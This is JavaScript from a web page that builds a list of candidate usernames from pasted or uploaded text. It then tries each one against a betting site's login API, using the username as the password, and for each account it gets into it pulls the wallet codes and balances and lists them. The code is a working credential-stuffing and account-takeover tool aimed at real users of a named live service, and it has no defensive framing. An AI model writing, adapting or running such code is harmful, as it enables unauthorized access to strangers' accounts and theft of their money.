    <script>
        const fileInput = document.getElementById('fileInput');
        const textInput = document.getElementById('textInput');
        const userList = document.getElementById('userList');
        const wordListContainer = document.getElementById('wordListContainer');
        const memberStats = document.getElementById('memberStats');
        const wordStats = document.getElementById('wordStats');

        // Process file input
        fileInput.addEventListener('change', function (e) {
            const file = e.target.files[0];
            if (!file) return;

            const reader = new FileReader();
            reader.onload = function (e) {
                textInput.value = e.target.result;
                processInput();
            };
            reader.readAsText(file);
        });

        // Process textarea input
        textInput.addEventListener('input', processInput);

        function processInput() {
            const text = textInput.value;
            if (!text.trim()) {
                userList.textContent = "No member codes processed yet.";
                wordListContainer.innerHTML = "";
                memberStats.textContent = "";
                wordStats.textContent = "";
                return;
            }

            // Replace all symbols with spaces (more comprehensive symbol list)
            const cleanedText = text.replace(/[^a-zA-Z0-9\s]/g, ' ');

            // Split into words, trim, and filter by length
            let words = cleanedText.split(/\s+/)
                .map(word => word.trim())
                .filter(word => word.length >= 6 && word.length <= 14);

            // Remove duplicates more efficiently
            words = removeDuplicates(words);

            // Sort alphabetically (case insensitive)
            words.sort((a, b) => a.toLowerCase().localeCompare(b.toLowerCase()));

            // Display word list with stats
            displayWordList(words);

            // Filter for member codes (more flexible pattern)
            const memberCodes = words.filter(word =>
                /^[a-zA-Z]+[\d_]+$/.test(word) ||  // user123 or user_123
                /^[\d_]+[a-zA-Z]+$/.test(word) || // 123user or _123user
                /^[a-zA-Z]+$/.test(word) ||      // username
                /^\d+$/.test(word)               // 123456
            );

            // Display member codes with stats
            if (memberCodes.length > 0) {
                memberStats.textContent = "";
                // userList.innerHTML = memberCodes.map(code =>
                //   `<span class="member-code">${code}</span>`
                //  ).join(' ');
            } else {
                memberStats.textContent = "";
                userList.textContent = "No valid member codes found.";
            }
        }

        function removeDuplicates(arr) {
            const seen = new Set();
            return arr.filter(item => {
                const lowerCaseItem = item.toLowerCase();
                if (!seen.has(lowerCaseItem)) {
                    seen.add(lowerCaseItem);
                    return true;
                }
                return false;
            });
        }

        function displayWordList(words) {
            wordListContainer.innerHTML = "";

            if (words.length === 0) {
                wordStats.textContent = "";
                wordListContainer.textContent = "No valid words found.";
                userList.innerHTML = "EMPTY";
                return;
            }

            wordStats.innerHTML = `<div class=\"container-fluid border shadow btn btn-outline-primary\">CLICK FOR VIEW TOTAL<span class=\"text-danger\"> ${words.length}</span> MEMBERCODES FOUND</div>`;
            wordStats.setAttribute("data-bs-toggle", "modal");
            wordStats.setAttribute("data-bs-target", "#inputViewer");

            const wordList = document.createElement('div');
            wordList.style.columnCount = "5";
            wordList.style.marginTop = "10px";

            words.forEach(word => {
                const wordElement = document.createElement('div');
                wordElement.className = "word-item";
                wordElement.textContent = word;
                wordList.appendChild(wordElement);
                document.getElementById('memberStats').innerHTML = "";
                document.getElementById('userList').innerHTML = "";
            });

            wordListContainer.appendChild(wordList);
        }


    </script>
    <script>
        let stopRequested = false;
        let successfulLogins = [];

        function fetchUsernamesFromProcessedList() {
            const wordListContainer = document.getElementById('wordListContainer');
            const usernames = [];
            if (wordListContainer) {
                wordListContainer.querySelectorAll('.word-item').forEach(div => {
                    usernames.push(div.textContent.trim());
                });
            }
            return usernames;
        }

        async function tryLogin(username) {
            if (stopRequested) return null;

            const loginData = {
                domain: "https://www.krikya11.com",
                membercode: username,
                password: username,
                platform: "desktop",
                option: "2",
            };

            // Ensure the POST request is made only once per login attempt
            let loginResponse, loginResult;
            try {
                loginResponse = await fetch("https://feapi.sharky777.xyz/api/token", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(loginData),
                });
                loginResult = await loginResponse.json();
            } catch (error) {
                console.log(`Network error for ${username}:`, error);
                return;
            }

            if (loginResponse.ok) {
                await fetchWalletDetails(loginResult.access_token, username);
            } else {
                console.log(`Login failed: ${username}`);
            }
        }
        async function fetchWalletDetails(token, username) {
            if (stopRequested) return;

            const response = await fetch(
                "https://feapi.sharky777.xyz/api/member/wallets", {
                method: "GET",
                headers: {
                    Authorization: `Bearer ${token}`
                },
            }
            );

            const result = await response.json();
            if (response.ok) {
                const wallets = result.data.wallets.map((wallet) => ({
                    code: wallet.wallet_code,
                    balance: wallet.balance
                }));
                displaySuccessResponse(username, wallets);

                // Create and append wallet info elements
                const tableBody = document.getElementById("tableBody");
                wallets.forEach(wallet => {
                    const tr = document.createElement('tr');
                    tr.innerHTML = `<td>${username}</td><td>${wallet.code}</td><td>${wallet.balance}</td>`;
                    tableBody.appendChild(tr);
                });

                successfulLogins.push({
                    username,
                    wallets
                });
            }
        }

        function displaySuccessResponse(username, wallets) {
            // Update successful usernames in localStorage
            successfulLogins.push(username);
            localStorage.setItem('successfulUsernames', successfulLogins.join(','));

            // Display successful usernames as <ul><li>
            const successOutput = document.getElementById("successOutput");
            let ul = successOutput.querySelector('ul');
            if (!ul) {
                ul = document.createElement('ul');
                successOutput.innerHTML = '';
                successOutput.appendChild(ul);
            }
            const li = document.createElement('li');
            li.textContent = username;
            ul.appendChild(li);
        }

        // Creates a div with a span for username and balance, and adds it to #successOutput
        function createUserBalanceDiv(username, balance) {
            const tableBody = document.getElementById("tableBody");
            const tr = document.createElement('tr');
            tr.innerHTML = `<td>${username}</td> <td>${balance}</td>`;
            tableBody.appendChild(tr);
        }

        const mainButton = document.getElementById('mainButton');
        const stopButton = document.getElementById('stopButton');

        mainButton.addEventListener('click', () => {
            processLoginFile()
        });

        stopButton.addEventListener('click', () => {
            stopLoginAttempts();
        });

        async function processLoginFile() {
            stopRequested = false;
            successfulLogins = [];
            const usernames = fetchUsernamesFromProcessedList();
            for (const username of usernames) {
                if (stopRequested) {
                    console.log("STOPPED");
                    alert("STOPPED");
                    return;
                }
                try {
                    await tryLogin(username);
                } catch (error) {
                    console.log(username, error);
                }
            }
            alert("Login process finished!");
        }


        function stopLoginAttempts() {
            stopRequested = true;
        }
    </script>
